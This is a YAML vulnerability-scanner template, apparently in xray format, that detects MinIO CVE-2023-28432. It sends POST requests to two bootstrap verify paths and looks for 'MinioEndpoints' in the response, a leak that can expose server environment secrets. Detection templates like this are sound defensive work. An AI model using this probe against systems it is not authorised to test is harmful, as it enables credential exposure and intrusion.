name: yaml-poc-minio-minio-leak-CVE-2023-28432
binding: 28aa1dee-9a4b-4f3b-a7d0-7a76cfd54f7e
detail:
    author: yu.wang05
    links:
        - https://github.com/minio/minio/releases/tag/RELEASE.2023-03-20T20-16-18Z
        - https://github.com/minio/minio/security/advisories/GHSA-6xvq-wj2x-3h3q
        - https://twitter.com/Andrew___Morris/status/1639325397241278464
        - https://viz.greynoise.io/tag/minio-information-disclosure-attempt
        - https://www.greynoise.io/blog/openai-minio-and-why-you-should-always-use-docker-cli-scan-to-keep-your-supply-chain-clean
    vulnerability:
        id: 2e661144-1d3b-4168-902c-d4c72d51eb66
        level: high
    warning: Harmless
transport: http
rules:
    poc01:
        request:
            cache: true
            method: POST
            path: /minio/bootstrap/v1/verify
            headers:
                Content-Type: application/x-www-form-urlencoded
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(b"MinioEndpoints")
    poc02:
        request:
            cache: true
            method: POST
            path: /bootstrap/v1/verify
            headers:
                Content-Type: application/x-www-form-urlencoded
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(b"MinioEndpoints")
expression: poc01() || poc02()
